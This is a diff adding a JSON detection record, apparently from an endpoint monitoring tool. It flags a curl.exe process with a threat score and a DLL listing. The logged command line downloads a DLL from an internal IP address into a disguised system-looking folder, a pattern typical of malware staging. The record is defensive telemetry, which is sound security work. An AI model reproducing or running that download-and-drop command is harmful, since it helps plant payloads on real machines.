@@ -1,0 +1,29 @@
+{
+    "suspiscious_ip": [],
+    "suspicious_ports": [],
+    "connect_to_inet": [],
+    "suspicious_commands": "curl http://192.168.146.128/RjvPlatform.dll -o C:\\$SysReset\\Framework\\Stack\\RjvPlatform.dll",
+    "suspicious_cmd_args": [],
+    "threat_score": 30,
+    "is_dangerous": false,
+    "pid": 8404,
+    "process_name": "curl.exe",
+    "cmdline": "curl http://192.168.146.128/RjvPlatform.dll -o C:\\$SysReset\\Framework\\Stack\\RjvPlatform.dll",
+    "watchlisted_cmd": "curl http://192.168.146.128/RjvPlatform.dll -o C:\\$SysReset\\Framework\\Stack\\RjvPlatform.dll",
+    "trace": "d2411a34-59f9-464b-a5db-fff24ffcf0d9",
+    "listdlls_output": [
+        {
+            "base_address": "0x00000000c57c0000",
+            "size": "0x96000",
+            "path": "C:\\Windows\\SYSTEM32\\curl.exe",
+            "verified": null,
+            "publisher": null,
+            "description": null,
+            "product": null,
+            "version": null,
+            "file_version": null,
+            "create_time": null
+        }
+    ],
+    "suspicious_dlls": []
+}
